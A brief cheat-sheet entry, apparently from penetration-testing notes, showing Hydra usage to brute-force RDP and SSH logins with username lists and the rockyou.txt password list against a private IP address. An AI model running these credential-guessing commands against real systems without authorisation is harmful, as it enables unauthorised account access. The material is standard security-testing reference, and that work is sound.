-- -
Network service brute forcing tool
### Usage
```bash
hydra -L <username list> -P <password list> <protocol>:<ip>
hydra -L user.lst -P rockyou.txt rdp://192.168.75.68

# use -t 4 for ssh
hydra -L user.list -P rockyou.txt ssh:192.168.75.68 -t 4
```